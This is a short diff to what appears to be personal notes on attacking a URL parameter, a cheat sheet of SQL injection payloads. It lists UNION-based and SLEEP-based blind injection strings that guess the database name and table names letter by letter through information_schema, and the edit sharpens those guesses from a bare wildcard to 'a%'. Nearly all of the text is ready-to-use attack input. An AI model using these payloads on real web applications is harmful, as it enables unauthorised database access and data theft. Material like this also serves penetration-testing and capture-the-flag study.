@@ -4,7 +4,7 @@ Change param in url.
 
 PARAM VALUE' union select 1,2,3;--
 
-PARAM VALUE' union select 1,2,3 where database() like '%';-- (Will help get DB)
+PARAM VALUE' union select 1,2,3 where database() like 'a%';-- (Will help get DB)
 
 PARAM VALUE' union select 1,2,3 from information_schema.tables where table_schema = 'DB NAME' and table_name like 'a%';-- (Will help get tables)
 
@@ -20,7 +20,7 @@ Change param in url.
 
 PARAM VALUE' union select SLEEP(5),2;--
 
-PARAM VALUE' union select SLEEP(5),2 where database() like '%';-- (Will help get DB)
+PARAM VALUE' union select SLEEP(5),2 where database() like 'a%';-- (Will help get DB)
 
 PARAM VALUE' union select SLEEP(5),2 from information_schema.tables where table_schema = 'DB NAME' and table_name like 'a%';-- (Will help get tables)
 
